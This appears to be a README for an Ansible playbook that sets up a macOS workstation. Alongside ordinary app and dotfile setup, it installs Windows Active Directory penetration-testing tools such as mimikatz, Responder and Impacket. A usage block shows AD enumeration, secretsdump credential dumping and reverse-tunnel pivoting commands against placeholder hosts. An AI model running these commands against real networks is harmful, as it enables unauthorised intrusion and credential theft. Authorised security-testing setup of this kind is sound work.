# Equip macOS

Ansible automation for equipping a fresh macOS installation.

## Segments

- `packages`: command-line tools, runtimes, and libraries (including Docker/Colima)
- `apps`: graphical macOS applications
- `rice`: appearance, Dock, preferences, and dotfiles
- `windows-pentest`: Windows AD/network penetration testing toolkit
- `pentesting`: General-purpose penetration testing tools

The `packages` segment installs Homebrew when it is missing, updates Homebrew,
upgrades installed formulae and casks only when outdated items are found, and
installs the selected command-line package list. The initial list contains tmux,
Homebrew Vim, docker, colima, and docker-compose.
The `apps` segment installs Brave, Spotify, Ghostty, Discord, Visual Studio Code,
and Microsoft Outlook when they are missing.
The `rice` segment pins Discord, Spotify, Brave, Ghostty, Visual Studio Code,
and Microsoft Outlook in that order; leaves Finder, Trash, and the Dock's folder
section intact; disables the suggested/recent-app section; and minimizes windows
into their application's Dock icon instead of creating separate thumbnails.
The `tmux-config` slice populates `~/.tmux.conf` and makes new windows and panes
inherit the active pane's working directory.
The `vim-config` slice populates `~/.vimrc` from the shared cross-platform static
files directory.

## Windows Pentesting Toolkit

Installed under `~/Documents/Windows/`:

| Directory | Contents |
|---|---|
| `Tools/` | Go-built AD tools (kerbrute, windapsearch, shortscan), cloned utilities (Responder, krbrelayx, targetedKerberoast, DS_Walk) |
| `Native/` | Windows binaries for transfer to target (mimikatz, nc.exe, Inveigh, PowerSploit) + CredentialHunting.txt reference |
| `Pivoting/` | Multi-platform tunnel binaries — ligolo-ng (proxy + agent) and chisel for darwin, linux, and windows amd64 |

**Python tools** (installed via `uv` into `~/.local/bin`):
NetExec, BloodHound.py CE, Impacket, ldapdomaindump, BloodyAD, Certipy,
evil-winrm-py, enum4linux-ng, pyWhisker, smbmap

**Other CLI tools** symlinked to `~/.local/bin`:
evil-winrm (Ruby gem), ldapsearch, responder2, targetedKerberoast.py,
krbrelayx.py, dnstool.py, addspn.py, printerbug.py, ds_walk.py, dsstore.py,
ligolo-proxy, ligolo-agent, chisel

### Usage

```sh
# Authenticated AD enumeration
nxc smb 10.10.10.10 -u user -p pass
bloodhound-ce-python -c All -d domain.local -u user -p pass -ns 10.10.10.10
secretsdump.py domain/user:'pass'@10.10.10.10
ldapdomaindump ldap://10.10.10.10 -u 'DOMAIN\user' -p 'pass'

# Pivoting
ligolo-proxy -selfcert
# on target: ligolo-agent -connect <your-ip>:11601 -ignore-cert
chisel client <your-ip>:8080 R:socks
```

Run every segment:

```sh
ansible-playbook site.yml
```

Run one segment:

```sh
ansible-playbook site.yml --tags packages
ansible-playbook site.yml --tags apps
ansible-playbook site.yml --tags rice
ansible-playbook site.yml --tags windows-pentest
ansible-playbook site.yml --tags homebrew
ansible-playbook site.yml --tags cli-packages
ansible-playbook site.yml --tags tmux-config
ansible-playbook site.yml --tags vim-config
ansible-playbook site.yml --tags applications
ansible-playbook site.yml --tags dock
```

Combine segments with a comma-separated tag list:

```sh
ansible-playbook site.yml --tags packages,apps
```
